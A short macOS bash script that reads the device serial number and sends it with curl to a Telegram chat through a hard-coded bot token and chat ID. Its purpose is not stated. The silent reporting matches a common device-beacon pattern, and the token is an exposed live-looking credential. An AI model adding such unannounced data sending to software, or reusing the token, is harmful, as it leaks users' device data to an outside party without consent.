#!/bin/bash

# Get the macOS device serial number
SN=$(system_profiler SPHardwareDataType | grep "Serial Number" | awk -F: '{print $2}' | sed 's/^ *//g')

# Check if SN is found
if [ -z "$SN" ]; then
    SN="Serial number not found"
fi

# Set Telegram Bot API Token and chat_id
TELEGRAM_BOT_API_TOKEN="8029283872:AAGy7sGBbfuuKoKWEQYkU2lB1roCBEGquk0"
TELEGRAM_CHAT_ID="-1002253378530"

# Construct the Telegram message URL
MESSAGE="Serialnumber:$SN"
TELEGRAM_URL="https://api.telegram.org/bot$TELEGRAM_BOT_API_TOKEN/sendMessage?chat_id=$TELEGRAM_CHAT_ID&text=$MESSAGE"

# Use curl to send the message to Telegram
curl -s "$TELEGRAM_URL"
